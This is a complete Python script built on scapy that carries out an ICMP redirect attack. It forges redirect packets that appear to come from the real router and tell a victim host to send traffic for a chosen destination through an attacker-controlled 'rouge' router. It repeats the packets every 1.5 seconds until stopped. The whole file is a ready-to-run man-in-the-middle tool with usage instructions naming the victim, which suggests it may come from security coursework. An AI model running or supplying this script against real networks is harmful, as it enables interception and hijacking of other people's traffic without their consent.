#!/usr/bin/python3
import sys, os, time
from scapy.all import *


def main():
    # ensure correct usage
    if len(sys.argv) != 5:
        usage()
        sys.exit(2)
    
    # unpack
    router = sys.argv[1]
    victim = sys.argv[2]
    rouge_r = sys.argv[3]
    destination = sys.argv[4]
    
    # create packets
    ip = IP(src = router, dst = victim)
    icmp = ICMP(type = 5, code = 1, gw = rouge_r)
    ip2 = IP(src = victim, dst = destination)
    
    # send the packet
    try:
        while True:
            send(ip / icmp / ip2 / ICMP());
            time.sleep(1.5)
    except KeyboardInterrupt:
        os.system('clear')

def usage():
    print('Usage: ./icmp_redirect.py <router> <victim> <rouge-r> <destination>\
    \n\trouter: IP address of the actual router\
    \n\tvictim: IP address of the victim\
    \n\trouge-r: IP address of the rouge router\
    \n\tdestination: IP address of the host outside victim network\n')


if __name__ == '__main__':
    main()
